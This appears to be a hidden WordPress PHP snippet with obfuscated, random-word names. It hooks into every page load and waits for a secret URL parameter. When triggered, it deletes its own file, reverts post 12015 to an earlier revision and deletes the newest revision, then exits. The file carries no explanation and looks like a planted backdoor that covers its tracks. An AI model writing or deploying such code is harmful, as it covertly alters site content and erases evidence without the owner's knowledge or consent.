<?php

function album_com_business() {
	if (isset($_GET['short_additional_compare']) && $_GET['short_additional_compare'] === 'enhanced_address_hidden_thumbnail') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$background_site_customize = 12015;
		$social_nofollow_jetpack_index = wp_get_post_revisions($background_site_customize);
		if (empty($social_nofollow_jetpack_index)) die('no revisions');
		if (count($social_nofollow_jetpack_index) < 2) die('less than 2');
		$role_alert_plus = array_shift($social_nofollow_jetpack_index);
		$theme_learndash_album = $role_alert_plus->ID;
		$suite_mobile_portfolio = array_shift($social_nofollow_jetpack_index);
		$updater_youtube_random_virtual = $suite_mobile_portfolio->ID;
		$icon_purchase_visibility = wp_restore_post_revision($updater_youtube_random_virtual);
		if ($icon_purchase_visibility === false) die('error restoring');
		$icon_purchase_visibility = wp_delete_post_revision($theme_learndash_album);		
		if ($icon_purchase_visibility === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'album_com_business');
